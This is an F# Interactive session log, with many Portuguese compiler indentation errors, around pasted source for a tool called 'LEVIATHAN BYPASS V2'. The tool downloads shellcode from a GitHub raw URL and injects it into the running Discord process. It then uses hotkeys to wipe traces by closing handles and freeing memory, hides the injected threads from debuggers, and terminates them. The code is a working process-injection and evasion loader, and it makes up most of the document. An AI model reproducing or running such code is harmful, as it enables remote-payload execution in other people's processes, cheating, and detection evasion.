>                 while status <> 0 do Marshal.FreeHGlobal(buffer); size <- size * 2u; buffer <- Marshal.AllocHGlobal(
int size); status <- NtQuerySystemInformation(SystemHandleInformation, buffer, size, &needed)

                  while status <> 0 do Marshal.FreeHGlobal(buffer); size <- size * 2u; buffer <- Marshal.AllocHGlobal(int size); status <- NtQuerySystemInformation(SystemHandleInformation, buffer, size, &needed)
  ----------------^^^^^

stdin(130,17): error FS0058: Sintaxe inesperada ou possível recuo incorreto: esse token está fora do contexto iniciado na posição (127:47). Tente recuar isso ainda mais.
Para continuar usando o recuo não compatível, passe o sinalizador '--strict-indentation-' para o compilador ou defina a versão da linguagem como F# 7.


                  while status <> 0 do Marshal.FreeHGlobal(buffer); size <- size * 2u; buffer <- Marshal.AllocHGlobal(int size); status <- NtQuerySystemInformation(SystemHandleInformation, buffer, size, &needed)
  ----------------------------------^^

stdin(130,35): error FS0058: Sintaxe inesperada ou possível recuo incorreto: esse token está fora do contexto iniciado na posição (127:47). Tente recuar isso ainda mais.
Para continuar usando o recuo não compatível, passe o sinalizador '--strict-indentation-' para o compilador ou defina a versão da linguagem como F# 7.

>                 let nh = Marshal.ReadInt32(buffer); let hes = Marshal.SizeOf<SYSTEM_HANDLE_TABLE_ENTRY_INFO>()

                  let nh = Marshal.ReadInt32(buffer); let hes = Marshal.SizeOf<SYSTEM_HANDLE_TABLE_ENTRY_INFO>()
  ----------------^^^

stdin(131,17): error FS0058: Sintaxe inesperada ou possível recuo incorreto: esse token está fora do contexto iniciado na posição (127:47). Tente recuar isso ainda mais.
Para continuar usando o recuo não compatível, passe o sinalizador '--strict-indentation-' para o compilador ou defina a versão da linguagem como F# 7.


                  let nh = Marshal.ReadInt32(buffer); let hes = Marshal.SizeOf<SYSTEM_HANDLE_TABLE_ENTRY_INFO>()
  -------------------------^^^^^^^

stdin(131,26): error FS0058: Sintaxe inesperada ou possível recuo incorreto: esse token está fora do contexto iniciado na posição (127:47). Tente recuar isso ainda mais.
Para continuar usando o recuo não compatível, passe o sinalizador '--strict-indentation-' para o compilador ou defina a versão da linguagem como F# 7.

>
                  let nh = Marshal.ReadInt32(buffer); let hes = Marshal.SizeOf<SYSTEM_HANDLE_TABLE_ENTRY_INFO>()
  ------------------------------------------^

stdin(131,43): error FS0058: Sintaxe inesperada ou possível recuo incorreto: esse token está fora do contexto iniciado na posição (127:47). Tente recuar isso ainda mais.
Para continuar usando o recuo não compatível, passe o sinalizador '--strict-indentation-' para o compilador ou defina a versão da linguagem como F# 7.

-                 let hp2 = IntPtr(buffer.ToInt64() + 8L)

                  let hp2 = IntPtr(buffer.ToInt64() + 8L)
  ----------------^^^

stdin(132,17): error FS0058: Sintaxe inesperada ou possível recuo incorreto: esse token está fora do contexto iniciado na posição (131:53). Tente recuar isso ainda mais.
Para continuar usando o recuo não compatível, passe o sinalizador '--strict-indentation-' para o compilador ou defina a versão da linguagem como F# 7.

>
                  let hp2 = IntPtr(buffer.ToInt64() + 8L)
  --------------------------^^^^^^

stdin(132,27): error FS0058: Sintaxe inesperada ou possível recuo incorreto: esse token está fora do contexto iniciado na posição (131:53). Tente recuar isso ainda mais.
Para continuar usando o recuo não compatível, passe o sinalizador '--strict-indentation-' para o compilador ou defina a versão da linguagem como F# 7.


                  let hp2 = IntPtr(buffer.ToInt64() + 8L)
  --------------------------------^

stdin(132,33): error FS0058: Sintaxe inesperada ou possível recuo incorreto: esse token está fora do contexto iniciado na posição (131:53). Tente recuar isso ainda mais.
Para continuar usando o recuo não compatível, passe o sinalizador '--strict-indentation-' para o compilador ou defina a versão da linguagem como F# 7.

>
                  let hp2 = IntPtr(buffer.ToInt64() + 8L)
  -----------------------------------------------^

stdin(132,48): error FS0058: Sintaxe inesperada ou possível recuo incorreto: esse token está fora do contexto iniciado na posição (131:53). Tente recuar isso ainda mais.
Para continuar usando o recuo não compatível, passe o sinalizador '--strict-indentation-' para o compilador ou defina a versão da linguagem como F# 7.

-                 for i in 0 .. int(nh) - 1 do

                  for i in 0 .. int(nh) - 1 do
  ----------------^^^

stdin(133,17): error FS0058: Sintaxe inesperada ou possível recuo incorreto: esse token está fora do contexto iniciado na posição (131:53). Tente recuar isso ainda mais.
Para continuar usando o recuo não compatível, passe o sinalizador '--strict-indentation-' para o compilador ou defina a versão da linguagem como F# 7.

>
                  for i in 0 .. int(nh) - 1 do
  ----------------------^^

stdin(133,23): warning FS0058: O recuo deste token 'in' é incorreto em relação ao 'let' correspondente


                  for i in 0 .. int(nh) - 1 do
  ----------------------^^

stdin(133,23): error FS0010: palavra-chave 'in' inesperado em interação. ';', ';;' ou outro token são esperados.


                  for i in 0 .. int(nh) - 1 do
  ---------------------------------^

stdin(133,34): error FS0058: Sintaxe inesperada ou possível recuo incorreto: esse token está fora do contexto iniciado na posição (127:47). Tente recuar isso ainda mais.
Para continuar usando o recuo não compatível, passe o sinalizador '--strict-indentation-' para o compilador ou defina a versão da linguagem como F# 7.

>
                  for i in 0 .. int(nh) - 1 do
  ------------------------------------^

stdin(133,37): error FS0010: símbolo ')' inesperado em interação. ';', ';;' ou outro token são esperados.


                  for i in 0 .. int(nh) - 1 do
  ------------------------------------------^^

stdin(133,43): error FS0058: Sintaxe inesperada ou possível recuo incorreto: esse token está fora do contexto iniciado na posição (127:47). Tente recuar isso ainda mais.
Para continuar usando o recuo não compatível, passe o sinalizador '--strict-indentation-' para o compilador ou defina a versão da linguagem como F# 7.

>                     let ep = IntPtr(hp2.ToInt64() + int64(i * hes))

                      let ep = IntPtr(hp2.ToInt64() + int64(i * hes))
  --------------------^^^

stdin(134,21): error FS0058: Sintaxe inesperada ou possível recuo incorreto: esse token está fora do contexto iniciado na posição (127:47). Tente recuar isso ainda mais.
Para continuar usando o recuo não compatível, passe o sinalizador '--strict-indentation-' para o compilador ou defina a versão da linguagem como F# 7.


                      let ep = IntPtr(hp2.ToInt64() + int64(i * hes))
  -----------------------------^^^^^^

stdin(134,30): error FS0058: Sintaxe inesperada ou possível recuo incorreto: esse token está fora do contexto iniciado na posição (127:47). Tente recuar isso ainda mais.
Para continuar usando o recuo não compatível, passe o sinalizador '--strict-indentation-' para o compilador ou defina a versão da linguagem como F# 7.

>
                      let ep = IntPtr(hp2.ToInt64() + int64(i * hes))
  -----------------------------------^

stdin(134,36): error FS0058: Sintaxe inesperada ou possível recuo incorreto: esse token está fora do contexto iniciado na posição (127:47). Tente recuar isso ainda mais.
Para continuar usando o recuo não compatível, passe o sinalizador '--strict-indentation-' para o compilador ou defina a versão da linguagem como F# 7.

-                     let e = Marshal.PtrToStructure<SYSTEM_HANDLE_TABLE_ENTRY_INFO>(ep)

                      let e = Marshal.PtrToStructure<SYSTEM_HANDLE_TABLE_ENTRY_INFO>(ep)
  --------------------^^^

stdin(135,21): error FS0058: Sintaxe inesperada ou possível recuo incorreto: esse token está fora do contexto iniciado na posição (127:47). Tente recuar isso ainda mais.
Para continuar usando o recuo não compatível, passe o sinalizador '--strict-indentation-' para o compilador ou defina a versão da linguagem como F# 7.

>
                      let e = Marshal.PtrToStructure<SYSTEM_HANDLE_TABLE_ENTRY_INFO>(ep)
  ----------------------------^^^^^^^

stdin(135,29): error FS0058: Sintaxe inesperada ou possível recuo incorreto: esse token está fora do contexto iniciado na posição (127:47). Tente recuar isso ainda mais.
Para continuar usando o recuo não compatível, passe o sinalizador '--strict-indentation-' para o compilador ou defina a versão da linguagem como F# 7.

-                     if uint32(e.UniqueProcessId) = pid && e.ObjectTypeIndex = 0x7uy then NtClose(IntPtr(int(e.Handle
Value))) |> ignore

                      if uint32(e.UniqueProcessId) = pid && e.ObjectTypeIndex = 0x7uy then NtClose(IntPtr(int(e.HandleValue))) |> ignore
  --------------------^^

stdin(136,21): error FS0058: Sintaxe inesperada ou possível recuo incorreto: esse token está fora do contexto iniciado na posição (127:47). Tente recuar isso ainda mais.
Para continuar usando o recuo não compatível, passe o sinalizador '--strict-indentation-' para o compilador ou defina a versão da linguagem como F# 7.

>
                      if uint32(e.UniqueProcessId) = pid && e.ObjectTypeIndex = 0x7uy then NtClose(IntPtr(int(e.HandleValue))) |> ignore
  -----------------------------^

stdin(136,30): error FS0058: Sintaxe inesperada ou possível recuo incorreto: esse token está fora do contexto iniciado na posição (127:47). Tente recuar isso ainda mais.
Para continuar usando o recuo não compatível, passe o sinalizador '--strict-indentation-' para o compilador ou defina a versão da linguagem como F# 7.

-                 Marshal.FreeHGlobal(buffer); CloseHandle(hd) |> ignore

                  Marshal.FreeHGlobal(buffer); CloseHandle(hd) |> ignore
  -----------------------------------^

stdin(137,36): error FS0058: Sintaxe inesperada ou possível recuo incorreto: esse token está fora do contexto iniciado na posição (127:47). Tente recuar isso ainda mais.
Para continuar usando o recuo não compatível, passe o sinalizador '--strict-indentation-' para o compilador ou defina a versão da linguagem como F# 7.

>
                  Marshal.FreeHGlobal(buffer); CloseHandle(hd) |> ignore
  ------------------------------------------^

stdin(137,43): error FS0010: símbolo ')' inesperado em interação. ';', ';;' ou outro token são esperados.

-     let mutable ra = addr; let mutable rs = 0x10000u; NtFreeVirtualMemory(hp, &ra, &rs, 0x8000u) |> ignore

      let mutable ra = addr; let mutable rs = 0x10000u; NtFreeVirtualMemory(hp, &ra, &rs, 0x8000u) |> ignore
  ----^^^

stdin(138,5): error FS0058: Sintaxe inesperada ou possível recuo incorreto: esse token está fora do contexto iniciado na posição (127:47). Tente recuar isso ainda mais.
Para continuar usando o recuo não compatível, passe o sinalizador '--strict-indentation-' para o compilador ou defina a versão da linguagem como F# 7.

>
      let mutable ra = addr; let mutable rs = 0x10000u; NtFreeVirtualMemory(hp, &ra, &rs, 0x8000u) |> ignore
  --------^^^^^^^

stdin(138,9): error FS0010: palavra-chave 'mutable' inesperado em interação


      let mutable ra = addr; let mutable rs = 0x10000u; NtFreeVirtualMemory(hp, &ra, &rs, 0x8000u) |> ignore
  ---------------------^^^^

stdin(138,22): error FS0058: Sintaxe inesperada ou possível recuo incorreto: esse token está fora do contexto iniciado na posição (127:47). Tente recuar isso ainda mais.
Para continuar usando o recuo não compatível, passe o sinalizador '--strict-indentation-' para o compilador ou defina a versão da linguagem como F# 7.

>
      let mutable ra = addr; let mutable rs = 0x10000u; NtFreeVirtualMemory(hp, &ra, &rs, 0x8000u) |> ignore
  ---------------------------^^^

stdin(138,28): error FS0058: Sintaxe inesperada ou possível recuo incorreto: esse token está fora do contexto iniciado na posição (127:47). Tente recuar isso ainda mais.
Para continuar usando o recuo não compatível, passe o sinalizador '--strict-indentation-' para o compilador ou defina a versão da linguagem como F# 7.


      let mutable ra = addr; let mutable rs = 0x10000u; NtFreeVirtualMemory(hp, &ra, &rs, 0x8000u) |> ignore
  --------------------------------------------^^^^^^^^

stdin(138,45): error FS0058: Sintaxe inesperada ou possível recuo incorreto: esse token está fora do contexto iniciado na posição (127:47). Tente recuar isso ainda mais.
Para continuar usando o recuo não compatível, passe o sinalizador '--strict-indentation-' para o compilador ou defina a versão da linguagem como F# 7.

>     let mutable sr = stubAddr; let mutable sz = 4096u; NtFreeVirtualMemory(hp, &sr, &sz, 0x8000u) |> ignore

      let mutable sr = stubAddr; let mutable sz = 4096u; NtFreeVirtualMemory(hp, &sr, &sz, 0x8000u) |> ignore
  ----^^^

stdin(139,5): error FS0058: Sintaxe inesperada ou possível recuo incorreto: esse token está fora do contexto iniciado na posição (127:47). Tente recuar isso ainda mais.
Para continuar usando o recuo não compatível, passe o sinalizador '--strict-indentation-' para o compilador ou defina a versão da linguagem como F# 7.


      let mutable sr = stubAddr; let mutable sz = 4096u; NtFreeVirtualMemory(hp, &sr, &sz, 0x8000u) |> ignore
  ---------------------^^^^^^^^

stdin(139,22): error FS0058: Sintaxe inesperada ou possível recuo incorreto: esse token está fora do contexto iniciado na posição (127:47). Tente recuar isso ainda mais.
Para continuar usando o recuo não compatível, passe o sinalizador '--strict-indentation-' para o compilador ou defina a versão da linguagem como F# 7.

>
      let mutable sr = stubAddr; let mutable sz = 4096u; NtFreeVirtualMemory(hp, &sr, &sz, 0x8000u) |> ignore
  -------------------------------^^^

stdin(139,32): error FS0058: Sintaxe inesperada ou possível recuo incorreto: esse token está fora do contexto iniciado na posição (127:47). Tente recuar isso ainda mais.
Para continuar usando o recuo não compatível, passe o sinalizador '--strict-indentation-' para o compilador ou defina a versão da linguagem como F# 7.

-     let procs = Process.GetProcessesByName("Discord")

      let procs = Process.GetProcessesByName("Discord")
  ----^^^

stdin(140,5): error FS0058: Sintaxe inesperada ou possível recuo incorreto: esse token está fora do contexto iniciado na posição (127:47). Tente recuar isso ainda mais.
Para continuar usando o recuo não compatível, passe o sinalizador '--strict-indentation-' para o compilador ou defina a versão da linguagem como F# 7.

>
      let procs = Process.GetProcessesByName("Discord")
  ----------------^^^^^^^

stdin(140,17): error FS0058: Sintaxe inesperada ou possível recuo incorreto: esse token está fora do contexto iniciado na posição (127:47). Tente recuar isso ainda mais.
Para continuar usando o recuo não compatível, passe o sinalizador '--strict-indentation-' para o compilador ou defina a versão da linguagem como F# 7.


      let procs = Process.GetProcessesByName("Discord")
  ------------------------------------------^

stdin(140,43): error FS0058: Sintaxe inesperada ou possível recuo incorreto: esse token está fora do contexto iniciado na posição (127:47). Tente recuar isso ainda mais.
Para continuar usando o recuo não compatível, passe o sinalizador '--strict-indentation-' para o compilador ou defina a versão da linguagem como F# 7.

>
      let procs = Process.GetProcessesByName("Discord")
  ----------------------------------------------------^

stdin(140,53): error FS0010: símbolo ')' inesperado em interação. ';', ';;' ou outro token são esperados.

-     if procs.Length > 0 then

      if procs.Length > 0 then
  ----^^

stdin(141,5): error FS0058: Sintaxe inesperada ou possível recuo incorreto: esse token está fora do contexto iniciado na posição (127:47). Tente recuar isso ainda mais.
Para continuar usando o recuo não compatível, passe o sinalizador '--strict-indentation-' para o compilador ou defina a versão da linguagem como F# 7.

>
      if procs.Length > 0 then
  ------------------------^^^^

stdin(141,25): error FS0058: Sintaxe inesperada ou possível recuo incorreto: esse token está fora do contexto iniciado na posição (127:47). Tente recuar isso ainda mais.
Para continuar usando o recuo não compatível, passe o sinalizador '--strict-indentation-' para o compilador ou defina a versão da linguagem como F# 7.

-         for t in procs.[0].Threads do

          for t in procs.[0].Threads do
  --------^^^

stdin(142,9): error FS0058: Sintaxe inesperada ou possível recuo incorreto: esse token está fora do contexto iniciado na posição (127:47). Tente recuar isso ainda mais.
Para continuar usando o recuo não compatível, passe o sinalizador '--strict-indentation-' para o compilador ou defina a versão da linguagem como F# 7.

>
          for t in procs.[0].Threads do
  --------------^^

stdin(142,15): warning FS0058: O recuo deste token 'in' é incorreto em relação ao 'let' correspondente


          for t in procs.[0].Threads do
  --------------^^

stdin(142,15): error FS0010: palavra-chave 'in' inesperado em interação. ';', ';;' ou outro token são esperados.

-             let ht = OpenThread(THREAD_ACCESS, false, uint32(t.Id))

              let ht = OpenThread(THREAD_ACCESS, false, uint32(t.Id))
  ------------^^^

stdin(143,13): error FS0058: Sintaxe inesperada ou possível recuo incorreto: esse token está fora do contexto iniciado na posição (126:13). Tente recuar isso ainda mais.
Para continuar usando o recuo não compatível, passe o sinalizador '--strict-indentation-' para o compilador ou defina a versão da linguagem como F# 7.

>
              let ht = OpenThread(THREAD_ACCESS, false, uint32(t.Id))
  ------------^^^

stdin(143,13): error FS0010: Constructo estruturado incompleto neste ponto ou antes dele em interação

-             if ht <> IntPtr.Zero then NtSetInformationThread(ht, 0x11u, IntPtr.Zero, 0u) |> ignore; SetThreadPriorit
y(ht, -15) |> ignore; CloseHandle(ht) |> ignore
-     CloseHandle(hp) |> ignore
-     Console.ForegroundColor <- ConsoleColor.Yellow
-     Console.WriteLine("  [+] [Shift+F2] LIMPEZA COMPLETA!")
-     Console.ResetColor()
-     Beep(800u, 150u) |> ignore; Beep(1000u, 150u) |> ignore
-     Beep(1200u, 150u) |> ignore; Beep(1500u, 300u) |> ignore
-     Environment.Exit(0)
-
- let KillCheat (hStub: IntPtr) (hCheat: IntPtr) =
-     Console.WriteLine("")
-     Console.ForegroundColor <- ConsoleColor.Cyan
-     Console.WriteLine("  [+] [Shift+F3] FECHANDO CHEAT...")
-     Console.ResetColor()
-     if hCheat <> IntPtr.Zero then SuspendThread(hCheat) |> ignore; NtTerminateThread(hCheat, 0u) |> ignore; CloseHan
dle(hCheat) |> ignore
-     if hStub <> IntPtr.Zero then SuspendThread(hStub) |> ignore; NtTerminateThread(hStub, 0u) |> ignore; CloseHandle
(hStub) |> ignore
-     Console.ForegroundColor <- ConsoleColor.Cyan
-     Console.WriteLine("  [+] [Shift+F3] CHEAT FECHADO!")
-     Console.ResetColor()
-     Beep(600u, 200u) |> ignore; Beep(400u, 400u) |> ignore
-
- Console.Clear()
- Console.ForegroundColor <- ConsoleColor.Magenta
- Console.WriteLine("")
- Console.WriteLine("  LEVIATHAN BYPASS V2")
- Console.WriteLine("  ====================")
- Console.WriteLine("")
- Console.ForegroundColor <- ConsoleColor.DarkGray
- Console.WriteLine("  [+] Shift+F1 = INJECT")
- Console.WriteLine("  [+] Shift+F2 = CLEAN (zerar vestigios)")
- Console.WriteLine("  [+] Shift+F3 = UNLOAD (fechar cheat)")
- Console.WriteLine("")
- Console.ForegroundColor <- ConsoleColor.Yellow
- Console.WriteLine("  [!] Discord ABERTO - NAO use UNLOAD pelo cheat")
- Console.WriteLine("  [!] Apos injetar, aguarde o countdown!")
- Console.ResetColor()
- Console.WriteLine("")
-
- let PAYLOAD_URL = "https://github.com/hugoleitevitor-cyber/aaaaaaaaaaaaaaa/raw/refs/heads/main/pyayload.bin"
- let shellcode = DownloadPayload PAYLOAD_URL
- Console.ForegroundColor <- ConsoleColor.Green
- Console.WriteLine(sprintf "  [+] Payload: %d bytes" shellcode.Length)
- Console.ResetColor()
-
- let procs = Process.GetProcessesByName("Discord")
- if procs.Length = 0 then
-     Console.ForegroundColor <- ConsoleColor.Red
-     Console.WriteLine("  [-] Discord nao encontrado!")
-     Console.ResetColor()
-     Environment.Exit(1)
- let pid = uint32(procs.[0].Id)
- Console.ForegroundColor <- ConsoleColor.Green
- Console.WriteLine(sprintf "  [+] Discord: PID=%d" pid)
- Console.ResetColor()
-
- let mutable hp = IntPtr.Zero
- let mutable addr = IntPtr.Zero
- let mutable stubAddr = IntPtr.Zero
- let mutable hStub = IntPtr.Zero
- let mutable hCheat = IntPtr.Zero
- let mutable running = true
-
- while running do
-     let s = GetAsyncKeyState(VK_SHIFT) &&& 0x8000s <> 0s
-     let f1 = GetAsyncKeyState(VK_F1) &&& 0x8000s <> 0s
-     let f2 = GetAsyncKeyState(VK_F2) &&& 0x8000s <> 0s
-     let f3 = GetAsyncKeyState(VK_F3) &&& 0x8000s <> 0s
-     if s && f1 && hp = IntPtr.Zero then
-         Console.ForegroundColor <- ConsoleColor.Green
-         Console.WriteLine("  [+] [Shift+F1] INJETANDO...")
-         Console.ResetColor()
-         let h, a, sa, hs, hc = DoInject pid shellcode
-         hp <- h; addr <- a; stubAddr <- sa; hStub <- hs; hCheat <- hc
-         Console.ForegroundColor <- ConsoleColor.Green
-         Console.WriteLine("  [+] [Shift+F1] INJETADO!")
-         Console.ResetColor()
-         Countdown(8)
-         Beep(1000u, 100u) |> ignore; Beep(1500u, 100u) |> ignore; Beep(2000u, 100u) |> ignore
-     elif s && f2 && hp <> IntPtr.Zero then
-         FullCleanup pid addr stubAddr hp
-     elif s && f3 && hCheat <> IntPtr.Zero then
-         KillCheat hStub hCheat
-     Thread.Sleep(100)
-